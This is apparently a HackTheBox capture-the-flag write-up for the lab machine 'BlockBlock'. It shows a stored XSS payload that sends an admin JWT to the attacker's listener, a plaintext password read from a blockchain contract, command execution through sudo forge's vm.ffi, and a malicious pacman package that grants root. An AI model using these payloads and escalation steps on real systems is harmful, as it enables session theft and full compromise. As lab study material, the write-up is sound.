---
layout: post
title:  "BlockBlock"
date:   2026-11-24 22:29:17 -0500
categories: HTB-machine linux medium
tags: HTB CTF writeup xss jwt ethereum forge pacman sudo
---

{% raw %}
## Recon
I started with an nmap scan. Three ports are open:

```text
22/tcp   open  ssh    OpenSSH
80/tcp   open  http   Werkzeug (Flask)
8545/tcp open  ethereum JSON-RPC proxy
```

Port 80 is a Flask app called "Decentralized Blockchain Chat" (DBLC). Port 8545 is an Ethereum JSON-RPC endpoint, which is not something I see on every box.

## Foothold
### DOM XSS in the chat
On the chat page, `msg.sender` is put into the page with `innerHTML` and nothing is escaped. So if I register a user whose username is an HTML payload, it runs in the browser of anyone who sees my message.

I registered a user with this as the username. It reads the token from `/api/info` and sends it to my machine:

```html
<img src=x onerror="fetch('/api/info').then(r=>r.json()).then(d=>fetch('http://KALI:9999/?t='+d.token))">
```

Then I sent a message and used `report_user`. This makes the admin bot visit the chat, the XSS fires, and the admin JWT shows up in my listener on port 9999.

### Admin panel and the blockchain
With the admin JWT I could open the admin panel. It shows the `/api/json-rpc` proxy and the address of the Chat contract.

Blockchain storage is public, so anyone who can talk to the RPC can read it. I asked the Chat contract for its database, then called `getAccount` on the Database contract:

```text
Chat.database() -> Database contract: 0x75e41404...
Database.getAccount("keira") -> ("keira", "SomedayBitCoinWillCollapse", "user")
```

The password is stored in plain text on-chain.

## User
I used the password to log in over SSH as keira.

```bash
ssh keira@<target-ip>
# password: SomedayBitCoinWillCollapse
cat user.txt
```

## Root
### keira to paul: sudo forge
`sudo -l` shows that keira can run Foundry's `forge` as paul:

```bash
sudo -l
# (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
```

Forge has a cheatcode called `Vm.ffi()` that runs any command on the system. It needs `ffi = true` in `foundry.toml`. So I made a Foundry project with that setting and a test that calls `vm.ffi`:

```solidity
string[] memory cmd = new string[](3);
cmd[0] = "bash"; cmd[1] = "-c"; cmd[2] = "cat /root/root.txt";
vm.ffi(cmd);
```

Because forge runs as paul, the command runs as paul too. I used this to write my SSH key into paul's `authorized_keys`, then logged in over SSH as paul.

### paul to root: sudo pacman
paul can run pacman as root:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

pacman can install a local package, and a package can have an `.INSTALL` script with a `post_install` hook. That hook runs as root during install. So I built my own Arch package with `makepkg` and installed it:

```bash
makepkg  # build evil package
sudo pacman -U --noconfirm evil-1.0-1-any.pkg.tar.zst
```

My `post_install()` copied `/root/root.txt` and added paul to sudoers, which gave me root. This is the same idea as the pacman entry on GTFOBins.

After that I cleaned up: removed the SSH key from paul, uninstalled the package, and deleted the SUID bash copy, the sudoers line and the temp files.
{% endraw %}
